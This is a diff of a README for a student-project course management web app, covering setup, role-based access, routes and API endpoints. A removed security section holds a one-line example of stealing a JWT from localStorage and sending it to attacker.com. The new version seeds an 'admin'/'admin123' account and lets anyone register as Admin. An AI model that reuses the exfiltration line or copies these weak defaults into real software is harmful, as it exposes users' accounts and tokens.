@@ -1,313 +1,307 @@
-# Course Registration System
+# Course Management System
 
-A comprehensive backend API for managing course registrations, student enrollments, and instructor management with role-based access control.
-
-## Table of Contents
-- [Getting Started](#getting-started)
-- [Technologies Used](#technologies-used)
-- [Authentication & Security](#authentication--security)
-- [API Endpoints](#api-endpoints)
-- [Project Structure](#project-structure)
+A full-stack course management web application with a React frontend and an ASP.NET Core backend API. Supports role-based access for Admins, Instructors, and Students to manage courses, enrollments, and grades.
 
 ---
 
-## Getting Started
+## Table of Contents
 
-### Prerequisites
-- **.NET 10 SDK** - [Download here](https://dotnet.microsoft.com/download)
-- **PostgreSQL 13+** - Database server
-- **Git** - Version control
+- [Application Overview](#application-overview)
+- [Technologies Used](#technologies-used)
+- [Setup Instructions](#setup-instructions)
+  - [Backend Setup](#backend-setup)
+  - [Frontend Setup](#frontend-setup)
+- [Role-Based Access](#role-based-access)
+- [Frontend Pages & Routes](#frontend-pages--routes)
+- [API Endpoints](#api-endpoints)
+- [Project Structure](#project-structure)
+- [Authentication & Security](#authentication--security)
 
-### Installation & Running
+---
 
-#### 1. Clone the Repository
-```bash
-git clone <repository-url>
-cd WebAssignment
-```
+## Application Overview
 
-#### 2. Configure Database Connection
-Edit `appsettings.Development.json`:
-```json
-{
-  "ConnectionStrings": {
-    "DefaultConnection": "Host=localhost;Port=5432;Database=course_registration;Username=postgres;Password=your_password"
-  },
-  "Jwt": {
-    "Key": "your-very-long-secret-key-at-least-32-characters",
-    "Issuer": "YourAppName",
-    "Audience": "YourAppUsers",
-    "ExpirationMinutes": 60
-  }
-}
-```
+This application simulates a university course registration system. It covers the full lifecycle of a semester:
 
-#### 3. Install Dependencies
-```bash
-dotnet restore
-```
+- **Admins** set up the system — creating courses, students, and instructors, then enrolling students into courses.
+- **Instructors** manage their courses and assign final grades at the end of the semester.
+- **Students** browse available courses, view their enrolled courses, check their grades, and withdraw from courses.
 
-#### 4. Run Database Migrations
-```bash
-dotnet ef database update
-```
-
-#### 5. Start the Application
-```bash
-dotnet run
-```
-
-The API will be available at `https://localhost:5001` (HTTPS) or `http://localhost:5000` (HTTP).
+The frontend communicates with the backend over a REST API using JWT bearer tokens for authentication.
 
 ---
 
 ## Technologies Used
 
-### Core Framework
-- **ASP.NET Core 10** - Modern, high-performance web framework for building APIs and web applications. Provides built-in dependency injection, middleware pipeline, and scalability.
+### Backend
+| Technology | Purpose |
+|---|---|
+| ASP.NET Core 10 | Web API framework |
+| Entity Framework Core 10 | ORM and database migrations |
+| PostgreSQL 13+ | Relational database |
+| JWT Bearer | Stateless authentication |
+| BCrypt.Net | Password hashing |
 
-### Database
-- **PostgreSQL 13+** - Robust, open-source relational database. Chosen for ACID compliance, JSON support, and production-grade reliability.
-- **Entity Framework Core 10** - Object-relational mapper (ORM) for .NET. Simplifies database operations, provides type-safe queries, and supports migrations for version control.
-
-### Authentication & Security
-- **JWT (JSON Web Tokens)** - Stateless authentication mechanism. Each token is self-contained with encoded user claims, enabling scalable distributed systems.
-- **JWT Bearer** - ASP.NET Core middleware that validates JWT tokens in request headers.
-- **BCrypt.Net** - Industry-standard password hashing algorithm. Adds salt automatically and uses adaptive work factors to resist brute-force attacks.
-
-### Supporting Libraries
-- **System.IdentityModel.Tokens.Jwt** - IANA standard library for creating, reading, and validating JWT tokens.
-- **Npgsql** - .NET data provider for PostgreSQL. Efficient, feature-complete driver for database connectivity.
+### Frontend
+| Technology | Purpose |
+|---|---|
+| React 19 | UI framework |
+| Vite | Build tool and dev server |
+| React Router v7 | Client-side routing |
+| Axios | HTTP client for API calls |
+| Bootstrap 5 | Styling and layout |
 
 ---
 
-## Authentication & Security
+## Setup Instructions
 
-### Current Implementation: JWT (JSON Web Tokens)
+### Backend Setup
 
-The system currently uses **JWT Bearer tokens** for stateless authentication:
+#### Prerequisites
+- [.NET 10 SDK](https://dotnet.microsoft.com/download)
+- PostgreSQL 13+ running locally
 
-```
-POST /api/auth/login
-Response:
+#### 1. Configure the database connection
+
+Edit `appsettings.Development.json`:
+```json
 {
-  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
-  "username": "john_student",
-  "expiresAt": "2026-04-04T15:30:00Z"
+  "ConnectionStrings": {
+    "DefaultConnection": "Host=localhost;Port=5432;Database=project_db;Username=postgres;Password=your_password"
+  },
+  "Jwt": {
+    "Key": "your-super-secret-key-that-is-at-least-32-characters-long-for-hs256",
+    "Issuer": "WebAssignmentApp",
+    "Audience": "WebAssignmentUsers",
+    "ExpirationMinutes": 60
+  }
 }
 ```
 
-**Advantages:**
-- ✅ Stateless - No server-side session storage required
-- ✅ Scalable - Works seamlessly with distributed systems/microservices
-- ✅ Self-contained - All user info encoded in the token
-- ✅ Mobile-friendly - Works across different platforms
+#### 2. Restore dependencies
+```bash
+dotnet restore
+```
+
+#### 3. Apply database migrations
+```bash
+dotnet ef database update
+```
+
+#### 4. Run the backend
+```bash
+dotnet run
+```
+
+The API will be available at `http://localhost:5186`.
+
+A default admin account is seeded automatically:
+- **Username:** `admin`
+- **Password:** `admin123`
 
 ---
 
-### Industry Standard: HTTP-Only Cookies
+### Frontend Setup
 
-While JWT is used here, **HTTP-only cookies are the industry standard** for authentication security. Here's why:
+#### Prerequisites
+- [Node.js 18+](https://nodejs.org/)
 
-#### **Why HTTP-Only Cookies Are Superior for Security:**
-
-1. **Protection Against XSS (Cross-Site Scripting)**
-   - HTTP-only cookies cannot be accessed by JavaScript (`document.cookie` returns nothing)
-   - Malicious scripts cannot steal authentication tokens
-   - JWT stored in `localStorage` or cookies WITHOUT HTTP-only flag **ARE vulnerable**
-   ```javascript
-   // With HTTP-only cookie: SAFE ✅
-   // Attacker's JS code cannot access it
-   
-   // With localStorage JWT: VULNERABLE ❌
-   fetch('https://attacker.com?token=' + localStorage.getItem('token'))
-   ```
-
-2. **Automatic CSRF Protection**
-   - Browser automatically sends HTTP-only cookies with same-origin requests
-   - Server can validate SameSite flag to prevent CSRF attacks
-   - No manual token extraction needed
-   ```
-   Request to https://yoursite.com/api/enrollments
-   Browser automatically includes: Cookie: auth_token=...
-   ```
-
-3. **Transparent Token Refresh**
-   - Cookies can be updated server-side without client-side logic
-   - Implement refresh token rotation seamlessly
-   - No localStorage management needed
-
-4. **Clear Security Boundaries**
-   - Only sent to specified domain/path
-   - Cannot be read by JavaScript
-   - Cannot be sent to third-party domains (with SameSite=Strict)
-
-#### **HTTP-Only Cookie Best Practices:**
-
-```javascript
-// Server-side (Node.js/ASP.NET example)
-response.setHeader('Set-Cookie', [
-  `authToken=${token}; HttpOnly; Secure; SameSite=Strict; Max-Age=3600; Path=/api`
-]);
+#### 1. Navigate to the client directory
+```bash
+cd client
 ```
 
-| Property | Purpose | Value |
-|----------|---------|-------|
-| `HttpOnly` | Prevents JavaScript access | Always `true` |
-| `Secure` | Only sent over HTTPS | Always `true` |
-| `SameSite` | CSRF protection | `Strict` or `Lax` |
-| `Max-Age` | Token expiration | 3600 seconds |
+#### 2. Install dependencies
+```bash
+npm install
+```
 
-#### **Comparison: JWT vs HTTP-Only Cookies**
+#### 3. Start the development server
+```bash
+npm run dev
+```
 
-| Feature | JWT in localStorage | HTTP-Only Cookie |
-|---------|-------------------|-----------------|
-| XSS Vulnerability | 🔴 High | 🟢 Protected |
-| CSRF Vulnerability | 🟡 Requires manual CSRF token | 🟢 Built-in (SameSite) |
-| Stateless | 🟢 Yes | 🟢 Yes |
-| Mobile/SPA | 🟢 Easy | 🟡 Requires framework support |
-| Scalability | 🟢 Excellent | 🟢 Excellent |
-| Complexity | 🟡 Manual token management | 🟢 Built-in browser handling |
+The frontend will be available at `http://localhost:5173`.
 
-**Recommendation:** For web applications, use **HTTP-only cookies** with refresh token pattern. For mobile apps or SPAs that can't use cookies, use **JWT stored securely** (not localStorage).
+> The Vite dev server is configured to proxy all `/api` requests to `http://localhost:5186`, so the backend must be running first.
+
+---
+
+## Role-Based Access
+
+| Feature | Admin | Instructor | Student |
+|---|---|---|---|
+| Browse courses | ✅ | ✅ | ✅ |
+| Create / delete courses | ✅ | ❌ | ❌ |
+| Edit course details | ✅ | ✅ (title & hours only) | ❌ |
+| Manage students | ✅ (full edit) | ✅ (view only) | ❌ |
+| Manage instructors | ✅ (full edit) | ✅ (view only) | ❌ |
+| Enroll students in courses | ✅ | ❌ | ❌ |
+| View course enrollment roster | ✅ | ✅ | ❌ |
+| Assign grades | ✅ | ✅ | ❌ |
+| View own enrolled courses | ❌ | ❌ | ✅ |
+| Withdraw from a course | ❌ | ❌ | ✅ |
+
+---
+
+## Frontend Pages & Routes
+
+| Route | Page | Access |
+|---|---|---|
+| `/` | Home — role-specific dashboard | Public |
+| `/login` | Login form | Public |
+| `/register` | Register form | Public |
+| `/courses` | List of all courses | Public |
+| `/courses/new` | Create a new course | Admin |
+| `/courses/:id` | Edit course details | Admin, Instructor |
+| `/students` | List of all students | Admin, Instructor |
+| `/students/new` | Create a new student record | Admin |
+| `/students/:id` | View / edit a student | Admin, Instructor |
+| `/instructors` | List of all instructors | Admin, Instructor |
+| `/instructors/new` | Create a new instructor | Admin |
+| `/instructors/:id` | View / edit an instructor | Admin, Instructor |
+| `/enrollments` | Role-aware enrollment view | All authenticated |
+| `/enrollments/new` | Enroll a student in a course | Admin |
+
+### Enrollment page by role
+- **Admin** — select any student to view their courses and update grades
+- **Instructor** — select any course to see enrolled students and assign grades
+- **Student** — view their own enrolled courses and withdraw if needed
 
 ---
 
 ## API Endpoints
 
+All endpoints are prefixed with `/api`. Authenticated endpoints require the header:
+```
+Authorization: Bearer <jwt_token>
+```
+
 ### Authentication
-```
-POST   /api/auth/register     - Register new user (public)
-POST   /api/auth/login        - Login & receive JWT token (public)
-```
+| Method | Route | Access | Description |
+|---|---|---|---|
+| POST | `/auth/register` | Public | Register a new user (Student / Instructor / Admin) |
+| POST | `/auth/login` | Public | Login and receive a JWT token |
 
 ### Courses
-```
-GET    /api/courses                            - List all courses (public)
-GET    /api/courses/{id}                       - Get course details (public)
-POST   /api/courses                            - Create course (Admin only)
-PUT    /api/courses/{id}                       - Update course (Admin/Instructor)
-DELETE /api/courses/{id}                       - Delete course (Admin only)
-PUT    /api/courses/{courseId}/instructor/{id} - Assign instructor (Admin only)
-```
+| Method | Route | Access | Description |
+|---|---|---|---|
+| GET | `/course` | Public | List all courses |
+| GET | `/course/{id}` | Public | Get a single course |
+| POST | `/course` | Admin | Create a course |
+| PUT | `/course/{id}` | Admin, Instructor | Update a course |
+| DELETE | `/course/{id}` | Admin | Delete a course |
+| PUT | `/course/{courseId}/instructor/{instructorId}` | Admin | Assign instructor to a course |
 
 ### Students
-```
-GET    /api/students                      - List all students (Instructor/Admin)
-GET    /api/students/{id}                 - Get student details (Student/Instructor/Admin)
-POST   /api/students                      - Create student (Admin only)
-PUT    /api/students/{id}                 - Update student profile (Student/Admin)
-DELETE /api/students/{studentId}/withdraw/{courseId} - Withdraw from course (Student)
-```
+| Method | Route | Access | Description |
+|---|---|---|---|
+| GET | `/student` | Admin, Instructor | List all students |
+| GET | `/student/{id}` | Admin, Instructor, Student | Get a student by ID |
+| POST | `/student` | Admin | Create a student record |
+| PUT | `/student/{id}` | Admin, Student | Update a student record |
+| DELETE | `/student/{studentId}/withdraw/{courseId}` | Student | Withdraw from a course |
+
+### Instructors
+| Method | Route | Access | Description |
+|---|---|---|---|
+| GET | `/instructor` | Authenticated | List all instructors |
+| GET | `/instructor/{id}` | Authenticated | Get an instructor by ID |
+| POST | `/instructor` | Admin | Create an instructor record |
+| PUT | `/instructor/{id}` | Admin, Instructor | Update an instructor record |
+| GET | `/instructor/{id}/courses` | Authenticated | Get courses taught by an instructor |
+| GET | `/instructor/{id}/profile` | Authenticated | Get instructor profile |
+| PUT | `/instructor/{id}/profile` | Admin, Instructor | Update instructor profile |
 
 ### Enrollments
-```
-POST   /api/enrollments                            - Enroll student (Admin only) ⚠️
-GET    /api/enrollments/student/{studentId}       - Get student's courses (Authorized)
-GET    /api/enrollments/course/{courseId}         - Get course roster (Instructor/Admin)
-PUT    /api/enrollments/{studentId}/courses/{courseId} - Update grade (Instructor/Admin)
-```
-
-### Example Requests
-
-**Register as Student:**
-```bash
-curl -X POST https://localhost:5001/api/auth/register \
-  -H "Content-Type: application/json" \
-  -d '{
-    "username": "alice_j",
-    "email": "alice@university.edu",
-    "password": "SecurePass123",
-    "role": "Student"
-  }'
-```
-
-**Login:**
-```bash
-curl -X POST https://localhost:5001/api/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{
-    "username": "alice_j",
-    "password": "SecurePass123"
-  }'
-```
-
-**Get Available Courses:**
-```bash
-curl https://localhost:5001/api/courses
-```
-
-**Enroll in Course (with JWT token):**
-```bash
-curl -X POST https://localhost:5001/api/enrollments \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer eyJhbGc..." \
-  -d '{
-    "studentId": 1,
-    "courseId": 2
-  }'
-```
-
-**View My Enrolled Courses:**
-```bash
-curl https://localhost:5001/api/enrollments/student/1 \
-  -H "Authorization: Bearer eyJhbGc..."
-```
-
-**Update Grade (Instructor only):**
-```bash
-curl -X PUT https://localhost:5001/api/enrollments/1/courses/2 \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer eyJhbGc..." \
-  -d '{ "grade": "A" }'
-```
+| Method | Route | Access | Description |
+|---|---|---|---|
+| POST | `/enrollments` | Admin | Enroll a student in a course |
+| GET | `/enrollments/student/{studentId}` | Authenticated | Get a student's enrolled courses |
+| GET | `/enrollments/course/{courseId}` | Admin, Instructor | Get a course's enrolled students |
+| PUT | `/enrollments/{studentId}/courses/{courseId}` | Admin, Instructor | Update a student's grade |
 
 ---
 
 ## Project Structure
 
 ```
-WebAssignment/
-├── Controllers/           # API endpoints
+WebAssignment/                   ← Backend (.NET)
+├── Controllers/
 │   ├── AuthController.cs
 │   ├── CourseController.cs
 │   ├── StudentController.cs
 │   ├── EnrollmentController.cs
-│   ├── InstructorController.cs
-│   └── HomeController.cs
-├── Models/               # Database entities
+│   └── InstructorController.cs
+├── Models/
 │   ├── User.cs
 │   ├── Student.cs
 │   ├── Course.cs
 │   ├── Enrollment.cs
 │   ├── Instructor.cs
-│   └── UserRole.cs
-├── Services/            # Business logic
-│   ├── AuthenticationService.cs
-│   ├── CourseService.cs
-│   ├── StudentService.cs
-│   ├── EnrollmentService.cs
-│   └── InstructorService.cs
-├── Interfaces/          # Service contracts
-│   ├── IAuthenticationService.cs
-│   ├── ICourseService.cs
-│   ├── IStudentService.cs
-│   ├── IEnrollmentService.cs
-│   └── IInstructorService.cs
-├── DTOs/               # Data transfer objects
-│   ├── CourseCreateDto.cs
-│   ├── EnrollmentResponseDto.cs
-│   ├── LoginDto.cs
-│   ├── RegisterDto.cs
-│   └── ... (other DTOs)
-├── Database/           # Data access
+│   └── InstructorProfile.cs
+├── DTOs/
+├── Services/
+├── Interfaces/
+├── Database/
 │   └── ApplicationDbContext.cs
-├── Migrations/         # EF Core migrations
-├── Program.cs          # Application configuration
-├── appsettings.json
-└── WebAssignment.csproj
+├── Migrations/
+├── Program.cs
+└── appsettings.json
+
+client/                          ← Frontend (React + Vite)
+├── src/
+│   ├── components/
+│   │   ├── Navigation.jsx       ← Role-aware navbar
+│   │   └── ProtectedRoute.jsx   ← Auth + role guard
+│   ├── context/
+│   │   └── AuthContext.jsx      ← Global auth state, login/logout
+│   ├── pages/
+│   │   ├── HomePage.jsx
+│   │   ├── LoginPage.jsx
+│   │   ├── RegisterPage.jsx
+│   │   ├── CoursesPage.jsx
+│   │   ├── CourseCreate.jsx
+│   │   ├── CourseEdit.jsx
+│   │   ├── StudentsPage.jsx
+│   │   ├── StudentCreate.jsx
+│   │   ├── StudentDetail.jsx
+│   │   ├── InstructorsPage.jsx
+│   │   ├── InstructorCreate.jsx
+│   │   ├── InstructorDetail.jsx
+│   │   ├── EnrollmentsPage.jsx
+│   │   └── EnrollmentCreate.jsx
+│   ├── services/
+│   │   ├── api.js               ← Axios instance with JWT interceptor
+│   │   ├── authService.js
+│   │   ├── courseService.js
+│   │   ├── studentService.js
+│   │   ├── instructorService.js
+│   │   └── enrollmentService.js
+│   ├── utils/
+│   │   └── jwt.js               ← JWT decode helper
+│   ├── App.jsx                  ← Route definitions
+│   └── main.jsx
+├── package.json
+└── vite.config.js               ← Proxy config for /api → localhost:5186
 ```
 
 ---
 
+## Authentication & Security
 
+The system uses **JWT Bearer tokens** for stateless authentication. On login or registration the server returns a token containing the user's role, and optionally their linked `StudentId` or `InstructorId`. The frontend stores this token in `localStorage` and attaches it to every request via an Axios interceptor.
+
+### Token claims
+| Claim | Value |
+|---|---|
+| `NameIdentifier` | User ID |
+| `Name` | Username |
+| `Email` | Email address |
+| `Role` | `Admin`, `Instructor`, or `Student` |
+| `StudentId` | Linked student record ID (if set) |
+| `InstructorId` | Linked instructor record ID (if set) |
+
+### Security note
+
+Tokens are stored in `localStorage`, which is sufficient for a development/academic environment. For production, **HTTP-only cookies** are the recommended approach as they are inaccessible to JavaScript and protect against XSS attacks.
